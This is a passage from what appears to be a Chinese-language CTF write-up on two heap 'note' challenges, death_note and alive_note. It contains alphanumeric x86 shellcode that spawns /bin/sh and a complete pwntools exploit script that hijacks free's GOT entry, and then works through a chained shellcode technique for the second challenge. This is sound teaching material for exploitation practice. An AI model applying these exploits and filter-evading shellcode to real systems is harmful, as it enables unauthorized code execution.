    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">dec</span> <span class="no">eax</span> <span class="c">#构造0xff</span>
    <span class="no">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x46</span> <span class="c">#al = 0xb9</span>
    <span class="no">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x35</span><span class="p">],</span><span class="no">al</span> <span class="c">#set int 0x80</span>
    <span class="no">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x36</span><span class="p">],</span><span class="no">al</span>
</pre></div>
<p>这里要注意的是ebx+0x35这是我自行构造出来的，通过这一段当作滑板，构造出可见字符常数</p>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="no">ecx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x41</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x40</span>
</pre></div>
<p>所以最后就是</p>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="no">eax</span> <span class="c">#堆块地址</span>
    <span class="no">pop</span> <span class="no">ebx</span> <span class="c">#保存堆块地址到ebx</span>
    <span class="no">push</span> <span class="no">edx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">dec</span> <span class="no">eax</span> <span class="c">#构造0xff</span>
    <span class="no">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x46</span> <span class="c">#al = 0xb9</span>
    <span class="no">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x35</span><span class="p">],</span><span class="no">al</span> <span class="c">#set int 0x80</span>
    <span class="no">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">0x36</span><span class="p">],</span><span class="no">al</span>
    <span class="nf">push</span> <span class="no">ecx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x41</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x40</span>
    <span class="nf">push</span> <span class="no">ecx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x41</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x40</span>
    <span class="nf">push</span> <span class="no">ecx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x41</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x40</span>
    <span class="nf">push</span> <span class="no">ecx</span>
    <span class="nf">pop</span> <span class="no">eax</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x41</span>
    <span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x40</span>
    <span class="nf">push</span> <span class="no">edx</span>
    <span class="nf">pop</span> <span class="no">ecx</span>
    <span class="nf">push</span> <span class="mi">0x68</span> <span class="c">#push /bin/sh</span>
    <span class="no">push</span> <span class="mi">0x732f2f2f</span>
    <span class="nf">push</span> <span class="mi">0x6e69622f</span>
    <span class="nf">push</span> <span class="no">esp</span>
    <span class="nf">pop</span> <span class="no">ebx</span>
</pre></div>
<p>最后加上'\x74\x39'这个，拿来构造int 0x80的，就好了</p>
<h4 data-content="1" id="8e602692e7be5464d17d677286ed667d">exp</h4>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">local</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">host</span> <span class="o">=</span> <span class="s1">'127.0.0.1'</span> 
<span class="n">port</span> <span class="o">=</span> <span class="mi">10000</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
<span class="n">exe</span> <span class="o">=</span> <span class="s1">'./death_note'</span>
<span class="c1"># Load it if has exe</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Elf can't be load"</span><span class="p">)</span>

<span class="c1"># load libc </span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span> <span class="k">if</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="k">else</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc.so.6"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
<span class="c1">#don't forget to change it</span>
<span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>                              <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>                              <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span>                               <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>                                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span>                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rg</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">regex</span>                                   <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvregex</span><span class="p">(</span><span class="n">regex</span><span class="p">)</span>
<span class="n">rp</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span>                               <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>                                    <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">lg</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">addr</span>                                  <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'</span><span class="se">\033</span><span class="s1">[1;31;40m</span><span class="si">%20s</span><span class="s1">--&gt;0x</span><span class="si">%x</span><span class="se">\033</span><span class="s1">[0m'</span><span class="o">%</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">addr</span><span class="p">))</span>
<span class="n">ga</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">job</span><span class="o">=</span><span class="s2">""</span>                                  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">job</span><span class="p">)</span> <span class="k">if</span> <span class="n">local</span> <span class="k">else</span> <span class="mi">0</span>
<span class="n">ia</span>   <span class="o">=</span> <span class="k">lambda</span>                                         <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1"># break on aim addr</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">PIE</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">PIE</span><span class="p">:</span>
        <span class="n">text_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">"pmap {}| awk '{{print $1}}'"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">pid</span><span class="p">))</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
        <span class="n">ga</span><span class="p">(</span><span class="s1">'b *{}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="o">+</span><span class="n">addr</span><span class="p">)))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ga</span><span class="p">(</span><span class="s2">"b *{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>

<span class="c1"># get_one_gadget</span>
<span class="k">def</span> <span class="nf">get_one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">"one_gadget --raw "</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">))</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>
    <span class="c1"># Arch:     i386-32-little</span>
    <span class="c1"># RELRO:    Partial RELRO</span>
    <span class="c1"># Stack:    Canary found</span>
    <span class="c1"># NX:       NX disabled</span>
    <span class="c1"># PIE:      No PIE (0x8048000)</span>
    <span class="c1"># RWX:      Has RWX segments</span>

<span class="k">def</span> <span class="nf">c</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">c</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">c</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">rce</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">rce</span><span class="p">:</span>
        <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">get_one_gadget</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>

    <span class="c1">#start here</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'free'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x0804A060</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
    <span class="c1">#ga("b *0x8048865\nc\nn 4\ns")</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">'''</span>
<span class="s1">                    push eax</span>
<span class="s1">                    pop ebx #保存指针</span>
<span class="s1">                    push edx</span>
<span class="s1">                    pop eax</span>
<span class="s1">                    dec eax</span>
<span class="s1">                    xor al,0x46</span>
<span class="s1">                    xor byte ptr[ebx+0x35],al #set int 0x80</span>
<span class="s1">                    xor byte ptr[ebx+0x36],al</span>
<span class="s1">                    push ecx #这里作为滑板，填充数据</span>
<span class="s1">                    pop eax</span>
<span class="s1">                    xor al, 0x41</span>
<span class="s1">                    xor al, 0x40</span>
<span class="s1">                    push ecx</span>
<span class="s1">                    pop eax</span>
<span class="s1">                    xor al, 0x41</span>
<span class="s1">                    xor al, 0x40</span>
<span class="s1">                    push ecx</span>
<span class="s1">                    pop eax</span>
<span class="s1">                    xor al, 0x41</span>
<span class="s1">                    xor al, 0x40</span>
<span class="s1">                    push ecx # set al=0xb</span>
<span class="s1">                    pop eax</span>
<span class="s1">                    xor al, 0x41</span>
<span class="s1">                    xor al, 0x40</span>
<span class="s1">                    push edx  # set ecx=0</span>
<span class="s1">                    pop ecx</span>
<span class="s1">                    push 0x68 # push /bin/sh</span>
<span class="s1">                    push 0x732f2f2f</span>
<span class="s1">                    push 0x6e69622f</span>
<span class="s1">                    push esp</span>
<span class="s1">                    pop ebx</span>
<span class="s1">                    '''</span><span class="p">)</span> 
    <span class="n">lg</span><span class="p">(</span><span class="s2">"len"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x74\x39</span><span class="s1">'</span>
    <span class="n">new</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>

    <span class="n">ia</span><span class="p">()</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,)</span>
</pre></div>
<h3 data-content="1" id="7ff80bc4fc3c6e6da8eaea195d68c06d">alive_note</h3>
<h4 data-content="1" id="3a09bb12b8042c7409fe3ffa6440a646">漏洞利用</h4>
<p>自己利用还是不会，我感觉这题比那个note-service2难多了，讲真，这题考的纯字母数字shellcode在加上shellcode链构造，这是目前我遇到的最难的shellcode题目了</p>
<p>照着shellcode分析一遍，将过程梳理下</p>
<p>整体思路是通过构造shellcode链， 然后read(0,heap,size),读入shellcode执行， 这样就可以有非限制字符了</p>
<ol>
<li>确认需要读取的heap,我们可以将heap设置为我们已执行过的shellcode链的堆块，也就是说执行前的堆块都行，我们就用第1个堆块</li>
<li>我们要执行int 80软中断，read是eax=3,ebx=0,ecx=heap,edx=size</li>
<li>首先我们可以获得的是ecx，因为free调用的时候会传入heap地址，所以第一步设置ecx,这里经过测试发觉free的堆块地址会放到eax里，同时还有空闲字节设置edx=size</li>
</ol>
<div class="highlight"><pre><span></span><span class="nf">push</span> <span class="no">eax</span> 
<span class="no">pop</span> <span class="no">ecx</span> 
<span class="no">push</span> <span class="mi">0x7a</span>
<span class="nf">pop</span> <span class="no">edx</span>
<span class="nf">push</span> <span class="no">ebx</span>
<span class="nf">jne</span> <span class="mi">0x3a</span> <span class="c">#因为跳到0x38处，要减去2，指令长度为2</span>
</pre></div>
<p>发觉jne的0x不好选，因为题目有限制，看限制</p>
<p><strong>顺序: 1-&gt;5-&gt;2-&gt;6-&gt;4</strong></p>
<div class="highlight"><pre><span></span><span class="p">[</span><span class="s1">'0x0'</span><span class="p">,</span> <span class="s1">'0x20'</span><span class="p">,</span> <span class="s1">'0x30'</span><span class="p">,</span> <span class="s1">'0x31'</span><span class="p">,</span> <span class="s1">'0x32'</span><span class="p">,</span> <span class="s1">'0x33'</span><span class="p">,</span> <span class="s1">'0x34'</span><span class="p">,</span> <span class="s1">'0x35'</span><span class="p">,</span> <span class="s1">'0x36'</span><span class="p">,</span> <span class="s1">'0x37'</span><span class="p">,</span> <span class="s1">'0x38'</span><span class="p">,</span> <span class="s1">'0x39'</span><span class="p">,</span> <span class="s1">'0x41'</span><span class="p">,</span> <span class="s1">'0x42'</span><span class="p">,</span> <span class="s1">'0x43'</span><span class="p">,</span> <span class="s1">'0x44'</span><span class="p">,</span> <span class="s1">'0x45'</span><span class="p">,</span> <span class="s1">'0x46'</span><span class="p">,</span> <span class="s1">'0x47'</span><span class="p">,</span> <span class="s1">'0x48'</span><span class="p">,</span> <span class="s1">'0x49'</span><span class="p">,</span> <span class="s1">'0x4a'</span><span class="p">,</span> <span class="s1">'0x4b'</span><span class="p">,</span> <span class="s1">'0x4c'</span><span class="p">,</span> <span class="s1">'0x4d'</span><span class="p">,</span> <span class="s1">'0x4e'</span><span class="p">,</span> <span class="s1">'0x4f'</span><span class="p">,</span> <span class="s1">'0x50'</span><span class="p">,</span> <span class="s1">'0x51'</span><span class="p">,</span> <span class="s1">'0x52'</span><span class="p">,</span> <span class="s1">'0x53'</span><span class="p">,</span> <span class="s1">'0x54'</span><span class="p">,</span> <span class="s1">'0x55'</span><span class="p">,</span> <span class="s1">'0x56'</span><span class="p">,</span> <span class="s1">'0x57'</span><span class="p">,</span> <span class="s1">'0x58'</span><span class="p">,</span> <span class="s1">'0x59'</span><span class="p">,</span> <span class="s1">'0x5a'</span><span class="p">,</span> <span class="s1">'0x61'</span><span class="p">,</span> <span class="s1">'0x62'</span><span class="p">,</span> <span class="s1">'0x63'</span><span class="p">,</span> <span class="s1">'0x64'</span><span class="p">,</span> <span class="s1">'0x65'</span><span class="p">,</span> <span class="s1">'0x66'</span><span class="p">,</span> <span class="s1">'0x67'</span><span class="p">,</span> <span class="s1">'0x68'</span><span class="p">,</span> <span class="s1">'0x69'</span><span class="p">,</span> <span class="s1">'0x6a'</span><span class="p">,</span> <span class="s1">'0x6b'</span><span class="p">,</span> <span class="s1">'0x6c'</span><span class="p">,</span> <span class="s1">'0x6d'</span><span class="p">,</span> <span class="s1">'0x6e'</span><span class="p">,</span> <span class="s1">'0x6f'</span><span class="p">,</span> <span class="s1">'0x70'</span><span class="p">,</span> <span class="s1">'0x71'</span><span class="p">,</span> <span class="s1">'0x72'</span><span class="p">,</span> <span class="s1">'0x73'</span><span class="p">,</span> <span class="s1">'0x74'</span><span class="p">,</span> <span class="s1">'0x75'</span><span class="p">,</span> <span class="s1">'0x76'</span><span class="p">,</span> <span class="s1">'0x77'</span><span class="p">,</span> <span class="s1">'0x78'</span><span class="p">,</span> <span class="s1">'0x79'</span><span class="p">,</span> <span class="s1">'0x7a'</span><span class="p">]</span>
</pre></div>
<p>所以我们选的常数要在这个范围里面，0x7a就是因为他是最大的，所以我们就选了edx为0x7a,最好选的就是0x38左右，为什么，我第一个shellcode长度为8</p>
<div class="highlight"><pre><span></span>0x0:    0x00000000  0x00000011  0x31000000  0x00000000 <span class="c1">#堆块1完成</span>
0x10:   0x00000000  0x00000011  0x32000000  0x00000000
0x20:   0x00000000  0x00000011  0x33000000  0x00000000
0x30:   0x00000000  0x00000011  0x34000000  0x00000000
0x40:   0x00000000  0x00000011  0x35000000  0x00000000 <span class="c1">#堆块5完成</span>
0x50:   0x00000000  0x00000011  0x36000000  0x00000000
</pre></div>
<p>以这个为例子就是填充到0x10处,所以最小的限制字符就是0x30开头了，那就跳到0x48处,<br/>
jne跳转计算为0x48-0x10=0x38,所以第一个跳就是jne 0x3a,因为要-2,这个机器码对应的才是跳0x38</p>
<ol>
<li>我跳转到了第5块堆块，然后又要跳回来的话，就要设置大于0x80大小的值(因为0x80前是正数，0x80后才是负数),所以有</li>
</ol>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0x18</span><span class="o">-</span><span class="mh">0x4d</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
<span class="s1">'0xcb'</span>
</pre></div>
<p>所以jne 0xcb是我们想要的结果，然后这个对应的机器码为75C9，其实0xcb可以不用计算器算，用<strong>吾爱工具跳转指令计算器0.4b</strong>计算的我是，找了好久才用他，输入0x4d和0x18 就出来了，接下来将C9转换成可见字符，</p>
<p>xor byte ptr[ecx+0x46]</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0x4e</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span>
<span class="s1">'0x46'</span>
</pre></div>
<p>是0x46,这里就是计算那个偏移了ecx是堆块0，然后偏移</p>
<div class="highlight"><pre><span></span><span class="nf">pop</span> <span class="no">eax</span>
<span class="nf">dec</span> <span class="no">eax</span> <span class="c">#eax变为0xffffffff</span>
<span class="no">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ecx</span><span class="err">+</span><span class="mi">0x46</span><span class="p">],</span><span class="no">al</span> <span class="c">#合起来5个字节 0x46上面刚计算</span>
<span class="no">jne</span> <span class="mi">0xcb</span> <span class="c"># 这里是75C9,转变C9与0xff异或为0x36所以最终为7536</span>
</pre></div>
<div class="highlight"><pre><span></span>0x0:    0x00000000  0x00000011  0x31000000  0x00000000 <span class="c1">#1完成</span>
0x10:   0x00000000  0x00000011  0x32000000  0x00000000
0x20:   0x00000000  0x00000011  0x33000000  0x00000000
0x30:   0x00000000  0x00000011  0x34000000  0x00000000
0x40:   0x00000000  0x00000011  0x35000000  0x00000000 <span class="c1">#5完成</span>
0x50:   0x00000000  0x00000011  0x36000000  0x00000000
</pre></div>
<ol>
<li>接下来本应该是第2块堆块了</li>
</ol>
<p>参数已经设置好了，现在最主要要构造int 0x80了，所以就是xor变成int 0x80</p>
<p>我们将int 0x80放在最后一个执行的堆块里，就是第4块堆块，所以还是得先设置第四块</p>
<ol>
<li>设置第四块</li>
</ol>
<p>参数还要设置eax为0x3,所以先将eax变为0，</p>
<div class="highlight"><pre><span></span><span class="nf">pop</span> <span class="no">eax</span>
<span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x33</span>
<span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x30</span> <span class="c">#5个字节</span>
<span class="no">int</span> <span class="mi">0x80</span> <span class="c">#本来是\xcd\x80，两个都不可见，所以要将其变为可见，回到第二块堆块</span>
</pre></div>
<div class="highlight"><pre><span></span>0x0:    0x00000000  0x00000011  0x31000000  0x00000000 <span class="c1">#1完成</span>
0x10:   0x00000000  0x00000011  0x32000000  0x00000000
0x20:   0x00000000  0x00000011  0x33000000  0x00000000
0x30:   0x00000000  0x00000011  0x34000000  0x00000000 <span class="c1">#4完成</span>
0x40:   0x00000000  0x00000011  0x35000000  0x00000000 <span class="c1">#5完成</span>
0x50:   0x00000000  0x00000011  0x36000000  0x00000000
</pre></div>
<ol>
<li>再次回到第二块堆块</li>
</ol>
<div class="highlight"><pre><span></span><span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x46</span> <span class="c">#al=0xb9</span>
<span class="no">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ecx</span><span class="err">+</span><span class="mi">0x35</span><span class="p">],</span><span class="no">al</span> 
<span class="no">push</span> <span class="no">ebx</span> <span class="c">#为第四块的pop eax做准备</span>
<span class="no">jne</span> <span class="mi">0x3a</span> <span class="c">#同理跳到第六块去</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nf">pop</span> <span class="no">eax</span>
<span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x33</span>
<span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x30</span> <span class="c">#5个字节</span>
<span class="no">int</span> <span class="mi">0x80</span> <span class="c">#现在变成\x74\x80</span>
</pre></div>
<div class="highlight"><pre><span></span>0x0:    0x00000000  0x00000011  0x31000000  0x00000000 <span class="c1">#1完成</span>
0x10:   0x00000000  0x00000011  0x32000000  0x00000000 <span class="c1">#2完成</span>
0x20:   0x00000000  0x00000011  0x33000000  0x00000000
0x30:   0x00000000  0x00000011  0x34000000  0x00000000 <span class="c1">#4完成</span>
0x40:   0x00000000  0x00000011  0x35000000  0x00000000 <span class="c1">#5完成</span>
0x50:   0x00000000  0x00000011  0x36000000  0x00000000
</pre></div>
<ol>
<li>第六块堆块了</li>
</ol>
<p>先将堆块4改了</p>
<div class="highlight"><pre><span></span><span class="nf">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ecx</span><span class="err">+</span><span class="mi">0x36</span><span class="p">],</span><span class="no">al</span>  <span class="c">#int 0x80设置好了,3个字节</span>
<span class="no">xor</span> <span class="no">byte</span> <span class="no">ptr</span><span class="p">[</span><span class="no">ecx</span><span class="err">+</span><span class="mi">0x57</span><span class="p">],</span><span class="no">al</span>      <span class="c"># 在三个字节，将d8转化 0x5f-0x8</span>
<span class="no">jne</span> <span class="mi">0xda</span> <span class="c">#0x5e跳到0x38, 原机器码75d8,d8转为61,所以变为7561</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nf">pop</span> <span class="no">eax</span>
<span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x33</span>
<span class="nf">xor</span> <span class="no">al</span><span class="p">,</span><span class="mi">0x30</span> <span class="c">#5个字节</span>
<span class="no">int</span> <span class="mi">0x80</span> <span class="c">#现在变成\x74\x39</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0xb9</span><span class="o">^</span><span class="mh">0x80</span><span class="p">)</span>
<span class="s1">'0x39'</span>
</pre></div>
<div class="highlight"><pre><span></span>0x0:    0x00000000  0x00000011  0x31000000  0x00000000 <span class="c1">#1完成</span>
0x10:   0x00000000  0x00000011  0x32000000  0x00000000 <span class="c1">#2完成</span>
0x20:   0x00000000  0x00000011  0x33000000  0x00000000 <span class="c1">#3随便填充就好</span>
0x30:   0x00000000  0x00000011  0x34000000  0x00000000 <span class="c1">#4完成</span>
0x40:   0x00000000  0x00000011  0x35000000  0x00000000 <span class="c1">#5完成</span>
0x50:   0x00000000  0x00000011  0x36000000  0x00000000 <span class="c1">#6完成</span>
</pre></div>
<ol>
<li>将这些汇编代码转为可见字符，这里我用ollydbg加跳转指令计算器</li>
</ol>
<p>第一段:</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3875535a7a6a5950</span><span class="p">)</span>
<span class="s1">'PYjzZSu8'</span>
</pre></div>
<p>PYjzZSu8</p>
<p>第二段:</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3875533541304634</span><span class="p">)</span>
<span class="s1">'4F0A5Su8'</span>
</pre></div>
<p>4F0A5Su8</p>
<p>第三段: 随便</p>
<p>第四段:</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x39743034333458</span><span class="p">)</span>
<span class="s1">'X4340t9</span><span class="se">\x00</span><span class="s1">'</span>
</pre></div>
<p>X4340t9</p>
<p>第五段:</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x36754641304858</span><span class="p">)</span>
<span class="s1">'XH0AFu6</span><span class="se">\x00</span><span class="s1">'</span>
</pre></div>
<p>XH0AFu6</p>
